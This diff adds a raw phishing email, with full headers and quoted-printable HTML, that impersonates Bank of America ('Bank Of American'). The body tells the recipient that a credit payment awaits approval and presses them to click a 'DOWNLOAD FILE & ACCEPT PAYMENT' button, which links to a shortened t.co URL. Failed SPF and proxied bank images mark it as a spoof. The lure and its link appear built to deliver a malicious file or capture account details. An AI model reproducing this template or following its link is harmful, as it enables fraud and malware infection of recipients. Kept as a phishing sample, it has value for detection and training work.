@@ -1,0 +1,92 @@
+Return-Path: <soft@securemail.net>
+Received: from securemail.net ([131.113.41.97])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id 8tfgbe5g1fejb6o2rfp7boo51rnn5eqooap2s401
+ for zingerpie@kfcreview.com;
+ Fri, 16 Oct 2026 19:20:24 +0000 (UTC)
+Received-SPF: permerror (spfCheck: Error in processing SPF Record) client-ip=131.113.41.97; envelope-from=soft@securemail.net; helo=securemail.net;
+Authentication-Results: amazonses.com;
+ spf=permerror (spfCheck: Error in processing SPF Record) client-ip=131.113.41.97; envelope-from=soft@securemail.net; helo=securemail.net;
+ dmarc=none header.from=securemail.net;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFIbU8zOVJQT09LeXZ0eVljWGp5YlMxYlRnUDNSMTZtMkJsR1lsc3dQUzVSTnUvOTN6YzArUm9oUnhWYlNlMzhOdHNLRUFyK1F5cHp2VnZZSFNGSURCSEhLS0djTXI0OHZoVmtyTHZKeUczYStoR2tzemVpQ2J2Nk1LVjFyLzZpVG1jVk95d1pvMHdwb1NFMmMvZVpXalVmdFM5RVNUTUV3ZHp6bTFYU1FHZjJjN0FJU0wrYmRqU1dCU1pMWmNTWThOdmtTZzRDTjd4bWxkYllDRjlmaXdmbkIzckRIbk9qaElMRGkrUGk1cllsY1RQNG1aZWd6WjFIVFRwUy9MRE4vdlZTOHljcWkyOXdUTG9wbVVxdkhjdWZGVGlFcEtBUWZkZXVkQW13N05LZG10M1o4MUUzOTdVaTF3Sms5QjN4c1k9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=VUQRPROuKqfpS292odYIld7bidR/Vmka/O7pn4zjh4ddzqBlJJv0+C+Kqg5+tZ27YGrGTc7qqUTvGZ3/b4B9sNwioQL/z0NcpIDQmbPf0E4uq2OoS/fsz2Hokih+OKyWyZFlw/a89TMCwFjNt0AXyCdk8wAD/372RbBoyoiKQhM=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1792178424; v=1; bh=gckOrj3wStruEXOSdWkjAJakzwCT/H2JpdYI5kHrplk=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "Bank Of American" <soft@securemail.net>
+To: zingerpie@kfcreview.com
+Subject: Your Credit Payment Is Pending Approval
+Date: 17 Oct 2026 04:20:25 +0900
+Message-ID: <20261017042025.5AE10E5E35B55BDF@securemail.net>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><BODY><DIV role=3Dregion class=3D"I_ZiTj5d C_1GbO8e W_6D6F D_F ek_BB =
+z_n m_22RyjK em_N O_0 ah_16P6j9 ai_Zc7bQR" aria-labelledby=3Dmessage-view-b=
+ody-landmark data-test-id=3D"message-view-body">
+<DIV class=3D"no-tailwind msg-body mq_AS iy_A s_0" data-test-id=3D"message-=
+view-body-content">
+<DIV class=3D"je_2kCCw7 jb_dm5 X_7sfl N_7sfl">
+<DIV>
+<DIV>
+<DIV id=3Dyiv3013330197>
+<DIV>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D747 border=3D0>
+<TBODY>
+<TR>
+<TD vAlign=3Dtop width=3D747>
+<P>&nbsp;</P></TD></TR>
+<TR>
+<TD vAlign=3Dtop width=3D747><IMG border=3D0 src=3D"https://ecp.yuserconten=
+t.com/mail?url=3Dhttps%3A%2F%2Fbillpay-ui.bankofamerica.com%2Fbillpay_stati=
+c%2Fgeneric-bofa%2Fimages%2Fem_title_photo_747x103.gif&amp;t=3D1792115910&a=
+mp;ymreqid=3D63c8b8b7-6adb-e7b2-1cc1-ee01da015e00&amp;sig=3D0gKT4AJPX1QG1ja=
+Ib4LTVw--~D" width=3D747 height=3D103></TD></TR>
+<TR>
+<TD vAlign=3Dtop width=3D747><IMG border=3D0 src=3D"https://ecp.yuserconten=
+t.com/mail?url=3Dhttps%3A%2F%2Fbillpay-ui.bankofamerica.com%2Fbillpay_stati=
+c%2Fgeneric-bofa%2Fimages%2Fpixel.gif&amp;t=3D1792115910&amp;ymreqid=3D63c8=
+b8b7-6adb-e7b2-1cc1-ee01da015e00&amp;sig=3D9lmrNSLg2._f30asQ5sBhg--~D" widt=
+h=3D747 height=3D23></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D747 border=3D0>
+<TBODY>
+<TR>
+<TD vAlign=3Dtop width=3D160>&nbsp;</TD>
+<TD vAlign=3Dtop width=3D15><IMG border=3D0 src=3D"https://ecp.yusercontent=
+=2Ecom/mail?url=3Dhttps%3A%2F%2Fbillpay-ui.bankofamerica.com%2Fbillpay_stat=
+ic%2Fgeneric-bofa%2Fimages%2Fpixel.gif&amp;t=3D1792115910&amp;ymreqid=3D63c=
+8b8b7-6adb-e7b2-1cc1-ee01da015e00&amp;sig=3D9lmrNSLg2._f30asQ5sBhg--~D" wid=
+th=3D15 height=3D1>&nbsp;</TD>
+<TD vAlign=3Dtop width=3D562><B><FONT style=3D"FONT-FAMILY: 'Connections', =
+sans-serif" color=3D#333333 size=3D-1>Dear Recipient:</FONT></B><BR><BR><FO=
+NT style=3D"FONT-FAMILY: 'Connections', sans-serif" color=3D#333333 size=3D=
+-1>We are pleased to inform you that a credit transaction has been successf=
+ully processed on your account. The following payment is awaiting your appr=
+oval and is scheduled:</FONT><BR>&nbsp;=20
+<P>&nbsp;</P>
+<P><STRONG><FONT color=3D#333333 size=3D2 face=3DArial>Your action is requi=
+red to approve the funds. The funds is currently pending to be reflected in=
+ your account.</FONT></STRONG></P>
+<P style=3D"TEXT-ALIGN: center"><A style=3D"FONT-SIZE: 14px; TEXT-DECORATIO=
+N: none; FONT-FAMILY: Arial, sans-serif; COLOR: #ffffff; PADDING-BOTTOM: 12=
+px; PADDING-TOP: 12px; PADDING-LEFT: 20px; DISPLAY: inline-block; PADDING-R=
+IGHT: 20px; BACKGROUND-COLOR: #d40000; border-radius: 5px" href=3D"https://=
+t.co/NGeqZheuR9" rel=3D"nofollow noopener noreferrer" target=3D_blank>DOWNL=
+OAD FILE &amp; ACCEPT PAYMENT </A></P>
+<P><FONT style=3D"FONT-FAMILY: 'Connections', sans-serif" color=3D#333333 s=
+ize=3D-1>For your protection, we have attached secure access to your accoun=
+t. Kindly click the button above to review and accept your incoming payment=
+=2E </FONT></P>
+<P><FONT style=3D"FONT-FAMILY: 'Connections', sans-serif" color=3D#333333 s=
+ize=3D-1>Funds will be updated on your balance and will be available for us=
+e after approval.</FONT></P>
+<P>&nbsp;</P>
+<HR align=3Dleft color=3D#cccccc SIZE=3D1 width=3D562 noShade>
+
+<P>&nbsp;</P></TD>
+<TD vAlign=3Dtop width=3D10><IMG border=3D0 src=3D"https://ecp.yusercontent=
+=2Ecom/mail?url=3Dhttps%3A%2F%2Fbillpay-ui.bankofamerica.com%2Fbillpay_stat=
+ic%2Fgeneric-bofa%2Fimages%2Fpixel.gif&amp;t=3D1792115910&amp;ymreqid=3D63c=
+8b8b7-6adb-e7b2-1cc1-ee01da015e00&amp;sig=3D9lmrNSLg2._f30asQ5sBhg--~D" wid=
+th=3D10 height=3D1></TD></TR></TBODY></TABLE></DIV></DIV></DIV></DIV></DIV>=
+</DIV></DIV>
+<DIV class=3D"D_F eo_HB U_0 ab_C gl_C crqN_6Fd5 H_3n93F" data-test-id=3D"re=
+ply-toolbar"></DIV></BODY></HTML>
